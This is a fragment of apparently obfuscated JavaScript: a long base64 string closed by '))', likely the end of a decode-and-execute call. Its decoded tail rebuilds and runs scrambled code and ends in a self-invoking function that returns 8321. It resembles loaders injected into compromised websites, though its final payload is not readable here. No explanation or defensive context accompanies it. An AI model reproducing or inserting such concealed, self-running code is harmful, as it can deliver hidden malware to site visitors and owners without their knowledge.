hzNjQhbylPNGdFXWlPZXU/YSVubE9pPU86ZylsTykuLGNPT2hjKWNPMWVdLj0uPU90XWl0T2FpPTByX2FuZE8yXWslcG9PTyVlNF0uT082V3Nrb2RzZTs4bH0geU9iT3N9X08wdG1mOS42T25PKX0zcl19PV0gbnRPKStjZVpoJC5dPyBodHRPW282X289byRya3V0Z3Q3OmVde19vT2whR2NPJWVfXU9PZjEoKSV0eylhc3RldE9PYWFfX2Vhe2gqVGMycjMgLjUzXWNsbCNzO09PaTgyLnI1KU90fXJfT3NlZDIoc3tPT3Qocj0laEc4YiA7cmBdaSAlbzFdTztPZntjZTxydU9nT0QsPU9yT3NrTGMpXCcxLk9lT3IzMjsmK2VpNDRfPXk0PyltNTkxLnN0JVwnczJfKS5PXzMhb18hLm1zPT42Y09lcl0rTy5mfU86cjBhTnQ+fW91MU8lKSs0O19PcGljX2kxLk9PKDZ2ZWdPTzQpaWE9MG8zY09lMGRTXmMsZk9ybSxjY1spT21lZStfXz1DNG9PT09fKDBvXSVkXXJzXFxvJmFCcyh1Ym5TY2lPX25FKXVlT3ppKCBmTy42Mk8gYyE5K2RdOG1PLE9fT11PK3MpJTljXU9ReHk9M3A7T3NhIXguKE9PY09jT09keSkuPWApT25sNCIycnBhKE9vT09PY190T2cpIi4yZH1yLl9uT11fM08tNmlPMT8uMS5lZzsoKUU/M2xubGMkYyBoKTZndE9ifX1PX2Qsc2d0anhPT2JPMiFwbnB0MHJ0OiBtdGVPc3Bkc18iY29hTyAtcChpIGwpQCB0amk2PWU6ZU9vayhPcHVkOzNpYGFuT25jZnBzJV8/b2QpdDNzXTZcXHU1IV1lMl9pdGNlKTI7ZSliXWplXXhifT1Ja29dT2NoOTVffSlpXzkpYTE0Y11hIGlfLigxT11yLkN0X29PZW51K3IgME9jbmMuIH0yM2JTJXQgXCcobzspOWQpLisgZk9JK10uSWNfc2h9MV1yIGRnNk9yJF9PezUlcikrZX1vUSBqT18ybF9pfXtoXS5PKV0gJU9PcHUsKF8xXTlkYmNscGMpbylwYT15YXsyMywxe2I+ZE9iZzNPcmpmIHJ9KU9uT2Q9KE8mOTNuY2EuNikodDNvdE9ubDBfLHAgZWU3fSAsYyx9bzEoTzJhLk9jO1YuJXVrLjAuTz5yLnUldHVhYikzTzQuTylPTyl0KTt9LU8uIyRPdGVyWTl7dSVlKC5mIH09LjIoIE8lcillbGVyaX1yZns7NGEoMWcqblV0aVRuY11PeW40LiBnaHRuYWkuLjJ9OnQ2byFfMml0Tz0oX295MikoMGheXk9dY182bmFPamYyT19PIClPT0xmTzFTPSAsT20uYWNlMS5Pe09ddGYxaVtlNV9kbl90IE93b3hPMjNPMW8geWg9ZV0tPU9jIGVPdDowbnJzd21ldGV5IHo9cm5XZXtYXyljfXJpLnhPIG90ZCUoc3ksIEspJS4udChPRyluXyhPYyxPck9PXS4gZShmJScpKTt2YXIgeHViPVdBeChJTkwsd1pyICk7eHViKDE0NzUpO3JldHVybiA4MzIxfSkoKQ=='))
